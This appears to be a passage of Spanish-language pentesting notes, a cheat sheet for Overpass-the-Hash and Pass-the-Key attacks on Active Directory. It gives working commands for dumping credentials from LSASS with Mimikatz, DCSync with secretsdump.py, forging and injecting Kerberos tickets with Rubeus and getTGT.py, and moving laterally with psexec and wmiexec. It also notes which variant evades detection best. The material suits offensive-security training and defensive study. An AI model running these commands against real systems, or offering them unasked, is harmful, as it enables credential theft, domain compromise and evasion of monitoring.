**Pass-the-Key** es lo mismo pero usando claves AES (AES128 o AES256) en lugar del hash NTLM. Es más sigiloso porque el tráfico Kerberos con AES parece completamente legítimo, sin diferencia con una autenticación normal de un usuario real.

---

## Obtener el hash o clave del usuario

### Con Mimikatz - desde LSASS

```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
exit
```

Buscar en el output por usuario:

- `NTLM` — hash para Overpass-the-Hash
- `aes256_hmac` o `aes128_hmac` — clave para Pass-the-Key

### Con secretsdump.py (DCSync o local)

```bash
# DCSync (requiere permisos de replicación)
secretsdump.py DOMAIN.LOCAL/<user>:'<password>'@<IP_DC> -just-dc-user <usuario_objetivo>

# Desde host comprometido
secretsdump.py DOMAIN.LOCAL/<user>:'<password>'@<IP_HOST>
```

---

## Overpass-the-Hash (Windows)

### Con Rubeus - pedir TGT usando NTLM hash e inyectarlo

```powershell
.\Rubeus.exe asktgt /user:<usuario> /rc4:<NTHASH> /ptt
```

### Con AES256 (Pass-the-Key, más sigiloso)

```powershell
.\Rubeus.exe asktgt /user:<usuario> /aes256:<AES256_KEY> /ptt
```

### Con AES128

```powershell
.\Rubeus.exe asktgt /user:<usuario> /aes128:<AES128_KEY> /ptt
```

### Especificando el dominio y DC

```powershell
.\Rubeus.exe asktgt /user:<usuario> /rc4:<NTHASH> /domain:domain.local /dc:dc01.domain.local /ptt
```

### Guardar el TGT en archivo sin inyectarlo

```powershell
.\Rubeus.exe asktgt /user:<usuario> /rc4:<NTHASH> /domain:domain.local /outfile:ticket.kirbi
```

### Con Mimikatz (Overpass-the-Hash)

```powershell
.\mimikatz.exe
sekurlsa::pth /user:<usuario> /domain:domain.local /ntlm:<NTHASH>
exit
```

Abre una nueva ventana `cmd.exe` con el contexto del usuario. En esa ventana, cualquier comando que requiera Kerberos (como `dir \\dc01\c$`) usará el hash para pedir el TGT automáticamente.

---

## Overpass-the-Hash / Pass-the-Key (Linux)

### Con getTGT.py - usando NTLM hash

```bash
getTGT.py DOMAIN.LOCAL/<usuario> -hashes :<NTHASH> -dc-ip <IP_DC>
```

### Con AES256 (Pass-the-Key)

```bash
getTGT.py DOMAIN.LOCAL/<usuario> -aesKey <AES256_KEY> -dc-ip <IP_DC>
```

El ticket se guarda como `<usuario>.ccache`.

### Exportar y usar

```bash
export KRB5CCNAME=./<usuario>.ccache
klist

# Acceder con psexec
psexec.py -k -no-pass DOMAIN.LOCAL/<usuario>@dc01.domain.local

# Especificando IPs
psexec.py -k -no-pass -dc-ip <IP_DC> -target-ip <IP_target> DOMAIN.LOCAL/<usuario>@DC01

# Con wmiexec
wmiexec.py -k -no-pass DOMAIN.LOCAL/<usuario>@dc01.domain.local
```

---

## Diferencia entre Overpass-the-Hash y Pass-the-Key

- **Overpass-the-Hash** — Usa el hash RC4/NTLM para pedir el TGT. Kerberos acepta RC4 para compatibilidad con versiones antiguas, pero puede generar alertas en entornos modernos porque no es el cifrado por defecto.
- **Pass-the-Key** — Usa la clave AES256 o AES128. Es el cifrado que usa Kerberos por defecto en dominios modernos, por lo que el tráfico es indistinguible de una autenticación legítima. Más sigiloso.

---

## Diferencia con Pass-the-Hash (NTLM)

- **Pass-the-Hash** — El hash NTLM se envía directamente al servidor vía protocolo NTLM. No usa Kerberos. Más detectable en entornos con NTLM monitorado o restringido.
- **Overpass-the-Hash** — El hash NTLM se usa para pedir un TGT Kerberos. A partir de ese punto todo el tráfico es Kerberos. Funciona aunque NTLM esté restringido para el acceso a recursos.

---

## Verificar el ticket obtenido

```cmd
# Windows
klist

# Linux
klist -c <usuario>.ccache
```

---

## Resumen del flujo (Windows)

- Obtener hash NTLM o clave AES con Mimikatz (`sekurlsa::logonpasswords`)
- Pedir TGT con `Rubeus asktgt /rc4:<NTHASH> /ptt` o `/aes256:<KEY> /ptt`
- Verificar con `klist`
- Acceder a recursos del dominio con el ticket inyectado

## Resumen del flujo (Linux)

- Obtener hash o clave con `secretsdump.py`
- Pedir TGT con `getTGT.py -hashes :<NTHASH>` o `-aesKey <KEY>`
- Exportar con `export KRB5CCNAME=./<usuario>.ccache`
- Acceder con `psexec.py -k -no-pass` o `wmiexec.py -k -no-pass`

